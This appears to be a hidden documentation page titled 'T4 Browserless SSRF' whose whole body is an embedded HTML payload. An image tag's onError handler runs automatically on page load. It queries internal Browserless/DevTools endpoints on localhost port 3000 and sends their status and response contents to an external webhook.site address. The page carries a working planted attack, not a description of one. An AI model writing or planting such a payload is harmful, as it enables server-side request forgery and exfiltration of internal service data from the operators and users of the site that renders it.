---
title: T4 Browserless SSRF
deprecated: false
hidden: true
metadata:
  robots: index
---
<HTMLBlock>{`
<img src="x" onError="(async()=>{const wh='https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355';const urls=['http://localhost:3000/json','http://127.0.0.1:3000/json','http://localhost:3000/json/version','http://127.0.0.1:3000/json/version','http://localhost:3000/metrics','http://localhost:3000/json/list'];for(const u of urls){try{const r=await fetch(u);const b=await r.text();await fetch(wh+'?t=bless&u='+encodeURIComponent(u)+'&s='+r.status+'&d='+encodeURIComponent(b.slice(0,800)));}catch(e){await fetch(wh+'?t=bless_fail&u='+encodeURIComponent(u)+'&e='+encodeURIComponent(e.toString()));}}})()" />
`}</HTMLBlock>
